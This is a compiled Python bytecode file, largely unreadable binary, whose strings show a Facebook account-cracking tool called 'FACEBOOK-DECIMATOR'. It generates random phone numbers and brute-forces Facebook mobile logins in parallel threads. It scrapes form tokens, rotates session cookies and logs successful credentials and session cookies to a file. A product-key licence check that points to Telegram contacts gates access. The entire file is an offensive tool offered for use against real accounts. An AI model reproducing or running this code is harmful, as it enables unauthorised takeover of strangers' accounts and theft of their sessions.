�
    �(g/  �            
       ��  � d dl Z d dlmZ d dlZd dlZd dlZd dlZd dlmZ d dl	m
Z
 d dlZd dlZd dlmZmZmZ d dlZd dlmZ d dlmZ d dlZdZ e j*                  �       Zd	Zd dlZ ej2                  �       Z ej2                  �       Z ej2                  �       Z ej2                  �       Z ej<                  �        ej>                  jA                  �        d
� Z!d� Z" e!�        ejF                  jI                  d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d�        e%d e& e"�       �      z   �        e%d�       d� Z' e'�         e%d�       dZ(dZ) e%d�        e%d�        e%d�        e%d�        e%d�        e%d�       	  e* e+d �      �      Z,e,s e%d!�       e,d"kD  r e%d#�       e,d$k(  r e-�        e,d kD  re,d%k  r	 e%d&�       n�Ee,d"k(  r' e!�         e+d'�      Z) e+d(�      Z. e* e+d)�      �      ZdZ/e,d*k(  r)	  e0d+d,�      Z1e1je                  �       Z1 e%e1�        e-�        e,dk(  r� e!�         e* e+d.�      �      Z3	  e0 e&e3�      d/z   d,�      Z( e+d1�      Z4 e* e+d2�      �      Z5e5e3z  Z5 e+d3 e&e5�      z   d4z   �      Z6 e7e6�      e5k7  r e%d5 e&e5�      z   d6z   �        e-�         e* e+d7�      �      Z/e/d8kD  r e%d9�        e-�         e* e+d:�      �      Ze/d;kD  r e%d9�        e-�        dZ8e,d<k(  r� e!�         e& e+d=�      �      Z8 e* e+d.�      �      Z3	  e0 e&e3�      d/z   d,�      Z( e+d>�      Z4 e* e+d?�      �      Z5e5e3z  Z5 e+d3 e&e5�      z   d4z   �      Z6 e7e6�      e5k7  r e%d5 e&e5�      z   d6z   �        e-�         e* e+d@�      �      Z/e/d8kD  r e%d9�        e-�         e* e+d:�      �      Ze/d;kD  r e%d9�        e-�        i Z9dAZ:dBe9dC<   dDe9dE<   dFe9dG<   dHe9dI<   dJe9dK<   dLe9dM<   dNe9dO<   dPe9dQ<   dRe9dS<   dTe9dU<   dVe9dW<   dXe9dY<   dZe9d[<   d\e9d]<   i Z;d^� Z<d_� Z=d`� Z>da� Z?db� Z@ e j�                  e@e:e9f�c�      ZBeBj�                  �         e j�                  e@e:e9f�c�      ZDeDj�                  �         e j�                  e@e:e9f�c�      ZEeEj�                  �         e j�                  e@e:e9f�c�      ZFeFj�                  �         e j�                  e@e:e9f�c�      ZGeGj�                  �        dd� ZHd ZId ZJd ZKd ZLd ZMd ZNd ZOd ZPeJek  �r'd ZKg ZQeKe/k  �rej�                  �        e,d"k(  r.ej�                   e&e)�      �       ej�                   e&e.�      �       e,dk(  rbe(j�                  �       ZU eHeUe3�      ZUej�                   e&e4�       e&e6�      z    e&eU�      z   �       ej�                   e&e6�       e&eU�      z   �       e,d<k(  rSe(j�                  �       ZU eHeUe3�      ZUej�                   e&e4�       e&e6�      z    e&eU�      z   �       ej�                  e8�       ej�                  �        eOdek(  sePd k(  raej�                  �       sej�                  �       ZIn>ejF                  jI                  df�       	 ej�                  �       sej�                  �       ZIn�"d ZOdZP e j�                  e?e:eee9eeIef�c�      ZYeYj�                  �        eQj�                  eY�       eKdz  ZKeJdz  ZJeOdz  ZOejF                  jI                  dg e&eJ�      z   dhz    e&e�      z   diz   �       eKe/k  r��eQD ]�  ZYeYj�                  �        ej�                  �       s:ej�                  �        	 ej�                  dj�k�      ZNej�                  �        eNreMdz  ZMeLdz  ZLejF                  jI                  dl e&eM�      z   dhz    e&eL�      z   diz   �       �� ejF                  jI                  dm�       	 ej�                  �       sLej�                  �       Z\ e0d+dn�      Z]e]jI                   e&e\�      doz   �       e]j�                  �         e%e\�       �]	 eJek  r��'ejF                  jI                  dp e&eM�      z   dhz    e&eL�      z   dqz   �        e-�        y#   e%d-�       Y ��DxY w#   e%d0�        e-�        Y ��'xY w#   e%d0�        e-�        Y ��hxY w#  eNZNY ��QxY w)r�    N)�Fernet)�BeautifulSoup)�cookies)�Style�Back�Fore)�	_strptime)�datetime�   �d   c                  �   � t        j                  �       dk(  rt        j                  d�       y t        j                  d�       y )N�Windows�cls�clear)�platform�system�os� �    �!/storage/emulated/0/fbhack/d17.py�sclrr      s)   � ��O�O��y� ��)�)�E���)�)�G�r   c                  ��   � d} d}d}t        j                  �       D ]  }| t        |�      z   } � | D ]#  }|dk(  rd}|dk(  rd}|dk(  rd}|dk(  rd	}||z   }�% t        |�      }|D ]  }|t        |�      z   }� |S )
N� � �#�@�*�.�&�,�!)r   �uname�str�sorted)�jn�jn1�jn2�word�wd�srtds         r   �usidr+      s�   � ��������^�^��T���D�	�\�"� ��R���W�	�2���W�	�2���W�	�2���W�	�2�	�"�f�#� � �C�[���T�	�#�d�)�m�#� ��r   z[0;32mz|=][---------------------]=|z9|=][[42;30mHONOURGIT[0;33m(237)[0;34m  VMC  [0;32m]=|z+|=][[42;30mFACEBOOK-DECIMATOR   [0;32m]=|z@|=][[45;30mPOWER-BY:[[40;30m[[40;34mt.me/CyberHouse237[0;32mz=|=][[45;30mCONTACT:[40;30m[[40;34mt.me/HonourGit237[0;32mz |_____@v1.3.1(2024)__________|z#[37;33m>>>>>>>>>>>>>>>>>>>>>>>>>>>z$  [43;39mFREE-MODE-CRACKING[0;33m z#[37;33m>>>>>>>>>>>(O)>>>>>>>>>>>>>z[37;36mzUser id: [37;35mc                  �*  � d} d}i }d|d<   d|d<   d}d}	 t        d	d
�      }|j                  �       }|j                  �        t        |�      dk(  rd} | dk(  s| dk(  rt	        d�      }}t        �       }d}	d}
|j                  �       }t        |�      }	 |j                  |�      }t        j                  |j                  �       �      }	 	 |
dz   }
|
dk(  r$d}	t        d�       t        d�       d}t        �        t        j                  |�      }|j                   d   }|j#                  d�      }t%        |d   d�      }|d   j#                  d�      }t'        t)        |d   �      |d   d   t)        |d   �      �      }d   }|j#                  d�      }t'        t)        |d   �      t)        |d   �      t)        |d   �      �      }t        |d   �      t        |�      k7  rOt        d �       t        d!�       d}	t        d	d"�      }|j+                  d�       |j                  �        t        �        ||kD  rDt        d#�       d}	t        d	d"�      }|j+                  d�       |j                  �        t        �        |	sJt        d$�       t        d%|d   z   �       t        d	d"�      }|j+                  |�       |j                  �        y 	 ���#  d} Y ��wxY w#  t        d�       t        d�       t        d�       t        �        Y ��5xY w#  |	dk(  r
t        �        Y �RxY w)&N�-   r   zoMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36�
user-agent�gzip�accept-encodingzhttps://m.facebook.coms,   HST0uBuK-rpXypJyKdEcx978nbLFADIr9mibmCq5zio=z
access.key�r�emptyr   zEnter Product Key: [37;35mFzInValid Product KeyzYContact Honourgit237 With Your User_Id on Telegram Via the Link https://t.me/HonourGit237z8Or Email:[Honougit@gmail.com] To Get a Valid Product Key�
   Tz[0;31mAuthentication Errorz?[0;36mPlease Make Sure Your Have An Active Internet Connection�Dater   �   z%b�   �:�   r
   �-�devicez6[0;31mThe Loaded Key Was Not Created For Your Device!z][0;36mContact Honourgit237 With Your User_id Via the Link https//t.me/Honourgit237 For Help!�wzProduct Key Expiredz-[0;36mCongratulation Access Has Been GrantedzValid Still: [0;33m)�open�read�closer#   �inputr+   �encoder   �decrypt�json�loads�decode�print�exit�requests�get�headers�splitr	   r
   �int�write)�gm�itn�head�url�key�file�user_key�mainkey�
device_key�ext�coue�fer�access�fd�m�h�uds                    r   �	verifykeyr^   E   s�  � ������� F��l��������4����L���$��9�9�;�(��*�*�,���]�G���2� ��E�R��U��1�2�(�	���F��
����
�/�/�
���C�[��	��;�;�x� �(�	���H�O�O�%�	&�&� 	�)��Q��4�
�B�h��C�	�
*�+�	�
N�O�	�C��F��l�l�3��2��j�j���2��h�h�s�m�2��r�!�u�T��1���U�[�[���1��s�2�a�5�z�!�A�$�q�'�#�b��e�*�-�2��Z��2��h�h�s�m�2��s�2�a�5�z�#�b��e�*�S��A��Z�0�2�	�&��
��S��_�,�	�
E�F�	�
l�m��C�	�l�3�	�D��J�J�w���J�J�L��F���e�	�
� ��C�	�l�3�	�D��J�J�w���J�J�L��F�
�	�
<�=�	�
#�F�:�$6�
6�7�	�l�3�	�D��J�J�w���J�J�L�	� �C 	��%��"��	�����c�d��B�C��&��R�	�4�i��F�s$   �<K �4K �	G5K? �K	�-K<�?Lr   z	###MENU##z[1]:Crack From Phone Numberz'[2]:Crack With a Word From Phone Numberz[3]:View Logsz$[5]:Test Login Credential If Workingz[6]:ExitzEnter Option: [37;36mz[0;36mPlease Choose An Option�   z#[0;36mPlease Choose a Valid Option�   �   z[0;33mLoading...z1[0;32mEnter Facebook Phone No or Email: [37;36mz([0;32mEnter Facebook Password: [37;36mz![0;32mEnter No Of Test: [37;36mr8   zFB_ACCOUNT_LIST.txtr1   zNo Account Log Foundz;[0;32mEnter File Cracker! Choose From [4] to [6]: [37;36mzGDCRACK.txtzFAILED! DIGIT CRACKER NOT FOUNDz#[0;32mEnter Country Code: [37;36mz*[0;32mEnter Phone Number Length: [37;36mz&[0;32mEnter Any Active Number First [z]Digit: [37;36mzRandom Number Must [z]Digit LongzC[0;32mEnter RPT Max-10000 For Powerfull 4G Network MODEM: [37;36mi'  zFAIlED NUMBER TO LARGEzX[0;32mEnter Total Num To Crack Maximum[6FL(1000000)||5FL(100000)||4FL(10000)]: [37;36mi@B r5   z$[0;32mEnter a Random Name: [37;36mz"[0;32mEnter Country Code: [0;36mz)[0;32mEnter Phone Number Length: [0;36mzE[0;32mEnter RPT Max-[10000] For Powerfull 4G Network MODEM: [37;36mzhttps://m.facebook.com/z@"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"z	sec-ch-uaz?0zsec-ch-ua-mobilez	"Windows"zsec-ch-ua-platformz10.0.0zsec-ch-ua-platform-version�1zupgrade-insecure-requestszuMozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36r.   z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7�accept�none�sec-fetch-site�navigate�sec-fetch-mode�?1�sec-fetch-user�document�sec-fetch-destr/   r0   zen-US,en;q=0.9zaccept-languagezu=0, i�priorityc                 ��   � d}| j                  d�      }|D ]J  }|j                  d�      }|D ]2  }|j                  d�      }|D ]  }|dk(  r|c c c S ||k(  s�|dz  }� �4 �L y)Nr   r    �;�=r   )rJ   )	�string�find�i�sco�co�nco�ico�fco�cks	            r   �getcory     sn   � ����\�\�#����R��h�h�s�m�#��c�
�y�y��~�3��r��!�t��Y�	�4�x���T�Q�	 � � � 	
r   c                 �   � t        | d�      }|j                  d�      D ])  }|j                  d�      |k(  s�|j                  d�      c S  y )N�html.parserr?   �name�value�r   �find_allrH   )�conr|   �soupr?   s       r   �lsdr�   !  sA   � ��c�=�)���m�m�G�$�U�
�Y�Y�v����
�)�)�G�
�� %r   c                 �   � t        | d�      }|j                  d�      D ])  }|j                  d�      dk(  s�|j                  d�      c S  y )Nr{   �form�method�post�actionr~   )r�   r�   r�   s      r   r�   r�   (  sA   � ��c�=�)���]�]�6�"�T�	�X�X�h����
�(�(�8�
�� #r   c                 �R  � |j                  �        i }|j                  �       |d<   |j                  �       |d<   |j                  �        d}d}		 d|d<   |d   |d<   d|d<   d	|d
<   d|d<   d|d<   d|d<   d|d<   d|d<   |d   |d<   d	|d   z   } t        j                  | ||dd��      }
|
j
                  }t        |
j                  d   d�      }|st        |
j                  d   d�      }|r�|j                  �        |j                  dt        |�      z   dz   t        |d   �      z   dz   t        
j                  d    �      z   d!z   |
j                  d   z   d"z   �       |j                  �        |r2|j                  �        |j                  |�       |j                  �        y y #  d}Y ��xY w)#N�email�passr   zsame-originre   �cookiezhttps://free.facebook.com/�refererzhttps://free.facebook.com�originrf   rg   rh   ri   rj   rk   �975zviewport-widthrb   �dprr�   rP   �   F)�datarI   �timeout�allow_redirects�
Set-Cookiez c_user�c_userz.[45;30m[ok][ID][PhoneNumber][Email]:[0;33m [z]||[45;30m[Password]:[0;33m [z][0;36m
[Redirect]:�Locationz
[45;30m[SES-Cookies]:[0;34mz]


)
�acquirerH   �releaserG   r�   �status_codery   rI   �putr#   )rP   �
threadlock�workqrO   �state�ses�qdat�dat�send�checkpt�re�coks               r   �thrunr�   /  s-  � ��������h�h�j��W���X�X�Z��V��������	
���'�4����h�-�4��>�/�4�	�?�-�4��>�$�4����4���$�4����4����4��;��%�j�3�u�:�"�3�u�:�-�3��m�m�C�S��b��O�2�
���4��R�Z�Z��%�i�0�3�
��b�j�j��&�x�0�C� ������)�)�B�3�s�8�K�Ls�s�tw�x{�  }C�  yD�  uE�  E�  F`�  `�  ad�  eg�  eo�  eo�  pz�  e{�  a|�  |�  }d�  d�  eg�  eo�  eo�  p|�  e}�  }�  ~G�  G�  H�����������)�)�D�/����� 	����#�s   �BF  � F&c                 �  � d}d}	 	 t        j                  t        t        d��      }|j                  }|r�t        |j                  d   d�      }|j                  d   }|j                  d�      }d}d}|D ])  }|dk(  rt        |�      }|dz  }�|d	z   t        |�      z   }�+ t        |j                  d
�      }	t        |j                  �      }
|r%|	r#|
r!d}t        j                  |
||	d��       d}d}
d}	d}|dz  }��#  |}Y �xY w)Nr   r   r�   )rI   r�   r�   z datrr    r   rn   r�   )rP   r�   r�   )rG   rH   rP   rO   r�   ry   rI   rJ   r#   r�   �contentr�   �sesqr�   )�ulr\   �c�sendreq�req�reqco�coky�cat�cooki�reqlsd�requrlr�   s               r   �upcor�   S  s  � ���	
�����|�|�C��R�0�3��?�?�7��
����L�)�'�
2�E�	���\�	"�D�	���C��D�
�E�	�C����Q����J�e�	�1�f�c��#�I�c�%�j� �e� � �s�{�{�5�!�F��#�+�+��F���F��Q�	�X�X�V�U��8�9��V��V��V� �'��Q�$�!�7 	��0��1�s   �C+C: �:D )�target�argsc                 �b   � d}d}||k  r%t        |�      t        | |   �      z   }|dz  }||k  r�%|S )Nr   r   r   )r#   )�odt�n�dn�ks       r   �bsgr�   }  sB   � �������s���W�S��Q��[��"��Q�$�!� 	��s� 	�r   r3   z [0;31m Updating Sessionz[40;33mLOADING|TESTING[z]/[z][0;34mg����MbP?)r�   z[40;31mPROCESSING[��a�
z
[40;31mPROCESSED[z]
)_�	threading�cryptography.fernetr   �queuer   r   rG   �bs4r   �httpr   �sys�time�coloramar   r   r   rB   r	   r
   �gone�Lockr�   �	processes�asyncio�Queuer�   r�   r�   r�   �init�ansi�clear_screenr   r+   �stdoutrL   rE   r#   r^   �fgr"   rK   r?   �testlrF   �upass�reloadr<   �fblogr=   �dck�ccd�llen�numc�len�npcrO   rP   r�   ry   r�   r�   r�   r�   �Thread�sesthd�start�sesthd2�sesthd3�sesthd4�sesthd5r�   �upvrr   �loadr[   �l�pst�upld�sestt�thsr�   r�   �readline�flgr�   r2   rH   �thread�append�join�	load_data�	file_openr>   r   r   r   �<module>r�      sU	  �� � &� � � � � � 
� � $� $� � � � ����9�>�>��
�
�	� ��u�{�{�}���e�k�k�m���U�[�[�]���U�[�[�]�� ����� ��� � � ��
�* �� �
�
� � �� � �$� %� �M� N� �$� %� �9� :� �$� %� �T� U� �$� %� �Q� R� �$� %� �'� (� �.� /� �2� 3� �.� /� �m� � ��S���[�(� )� �m� �J�Z 
��
 �l� ����� �k� � �#� $� �/� 0� �o� � �,� -� �j� ��
�5�,�-�.��	��+�,�	�!�G��0�1�	�1�H��&�	�!�G��a������ � 	�!�8����F�G���=�>���u�>�?�@��	���!�8� ��"�3�'�%��
�
��%���,� ���!�8�����R�	S�T��	�	�#�c�(�=�
 ��%�"� �6�7��	�%�B�
C�D���s����7��D�	�A�BW�W�X����I�t�O���s�4�y�(��6�7��&��E�]�^�_��
�5�L�� �!��&��u�u�v�w��
�7�N�� �!��&����!�8�����;�	<�=����R�	S�T��	�	�#�c�(�=�
 ��%�"� �5�6��	�%�A�
B�C���s����7��D�	�A�BW�W�X����I�t�O���s�4�y�(��6�7��&��E�_�`�a��
�5�L�� �!��&��u�u�v�w��
�7�N�� �!��&�
 ����T��[� ���� �&��� �#+��!� "�"%�� � !� K��\� � Y��X����� �!��� ���� �!��� ���� �(��� ���Z� � ��
� ��"�H�@ �y���t�#�d��4�� �����	����3�t�*�5�� �����	����3�t�*�5�� �����	����3�t�*�5�� �����	����3�t�*�5�� ����� �����������������	�k������F�{�����
�A�X��8�8�C��J���8�8�C��J��
�A�X�	�{�{�}�3�
�3�s�|�3��8�8�C��H�S��Y��s�3�x�'�(��8�8�C��I�c�#�h���
�A�X�	�{�{�}�3�
�3�s�|�3��8�8�C��H�S��Y��s�3�x�'�(��8�8�C�=�����	�2�X����
�*�*�,����
�C��J�J���7�8�
��J�J�L�
�(�(�*�c�� � 	
�4�	�%�	��	�	��S��E�$�u�S�QU�,V�	W�&��,�,�.��*�*�V����'�$��Q�$�!���'�$��*�*���2�3�q�6�9�%�?��I��N�}�\�]�C �F�{�D �V��+�+�-�	����������	�	�%�	� �C� ����	��q�D�A��Q�$�!��*�*���-�c�!�f�4�U�:�3�q�6�A�-�O�P� � �����$���	�����Y�Y�[�9��'��,�9��?�?�3�y�>�$�&�'��?�?�������w �	�k�x �
�
� � �*�3�q�6�1�%�7��A��>�u�D� E� ���g �����	��)�*��&��.	��)�*��&��|��C�s0   �	!b! �b1 �"c �c�!
b.�1c�c�c&